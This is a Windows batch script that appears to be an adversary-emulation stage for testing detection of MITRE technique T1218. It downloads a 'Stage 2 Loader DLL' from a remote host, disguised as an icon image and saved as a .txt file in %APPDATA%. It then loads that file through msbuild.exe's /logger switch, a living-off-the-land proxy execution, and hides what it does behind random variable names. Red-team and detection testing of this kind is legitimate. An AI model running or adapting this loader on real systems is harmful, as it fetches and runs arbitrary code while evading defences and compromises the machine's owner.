@echo off
setlocal enabledelayedexpansion

REM Cache timestamp for debug logging
set tsvar=%DATE% %TIME%

REM Declare random-named SET variables for all PHR placeholders
SET aqlmze=https://10.0.0.49/stage/2/icon.png?10354-7
SET bdwcnx=%APPDATA%\10354\7fb922ae
SET crtpny=d8441ede.txt
SET dshkvu=%APPDATA%\7
SET egtflw=%APPDATA%\7\macula-simulations.log
SET fhyqir=ITZEL-S2B
SET gjkzps=10354
SET hnxwmo=7

REM Initialize log file path
set "logfile=%APPDATA%\!hnxwmo!\macula-simulations.log"

REM Ensure log directory exists
if not exist "%APPDATA%\!hnxwmo!" mkdir "%APPDATA%\!hnxwmo!"
if not exist "!bdwcnx!" mkdir "!bdwcnx!"

REM Debug: heartbeat start
echo [!tsvar!][DEBUG][!fhyqir!][!gjkzps!]: heartbeat_start>> "!logfile!" 2>nul

REM Heartbeat fetch – download the Stage 2 Loader DLL
curl -k -s -o "!bdwcnx!\!crtpny!" "!aqlmze!"

REM Debug: heartbeat complete
echo [!tsvar!][DEBUG][!fhyqir!][!gjkzps!]: heartbeat_complete>> "!logfile!" 2>nul

REM Change working directory to output directory
echo [!tsvar!][DEBUG][!fhyqir!][!gjkzps!]: chdir_start>> "!logfile!" 2>nul
cd /d "!bdwcnx!" >nul 2>&1
echo [!tsvar!][DEBUG][!fhyqir!][!gjkzps!]: chdir_result=!errorlevel!>> "!logfile!" 2>nul

REM Create minimal .proj file for msbuild
echo [!tsvar!][DEBUG][!fhyqir!][!gjkzps!]: proj_create_start>> "!logfile!" 2>nul
echo ^<Project/^> > "build.proj"
echo [!tsvar!][DEBUG][!fhyqir!][!gjkzps!]: proj_create_complete>> "!logfile!" 2>nul

REM Debug: msbuild start
echo [!tsvar!][DEBUG][!fhyqir!][!gjkzps!]: msbuild_start>> "!logfile!" 2>nul

REM Invoke LOLBIN msbuild via /logger: switch (ILogger pattern)
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe "!bdwcnx!\build.proj" /logger:LoggerEntry,"!bdwcnx!\!crtpny!";MyParameters,Foo >NUL 2>&1
set msbuild_errorlevel=!errorlevel!

REM Debug: msbuild complete
echo [!tsvar!][DEBUG][!fhyqir!][!gjkzps!]: msbuild_complete=!msbuild_errorlevel!>> "!logfile!" 2>nul

REM TTP execution logging (T1218)
if !msbuild_errorlevel! equ 0 (
    echo [%date% %time%][TTP][!fhyqir!][!gjkzps!]: T1218|System Binary Proxy Execution=[OK]:[]>> "!logfile!" 2>nul
) else (
    echo [%date% %time%][TTP][!fhyqir!][!gjkzps!]: T1218|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!logfile!" 2>nul
)

exit /b 0